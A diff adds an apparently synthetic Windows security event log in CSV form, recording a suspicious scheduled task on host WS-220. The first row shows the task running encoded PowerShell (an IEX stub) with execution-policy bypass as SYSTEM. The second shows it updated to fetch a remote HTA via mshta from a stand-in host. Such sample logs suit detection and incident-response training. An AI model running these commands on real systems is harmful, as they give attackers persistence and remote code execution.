@@ -1,0 +1,3 @@
+TimeCreated,Computer,EventID,TaskName,SubjectUserName,Message
+2025-08-16T03:26:00+05:30,WS-220,4698,Updater\UserTask,svc_updater,"A scheduled task was created. TaskName: Updater\UserTask, Author: ACME\\svc_updater, Action: powershell -ExecutionPolicy Bypass -enc SQBFAFgA..., RunAs: SYSTEM"
+2025-08-16T03:32:10+05:30,WS-220,4702,Updater\UserTask,svc_updater,"A scheduled task was updated. TaskName: Updater\UserTask, Action: mshta http://example[.]com/a.hta"
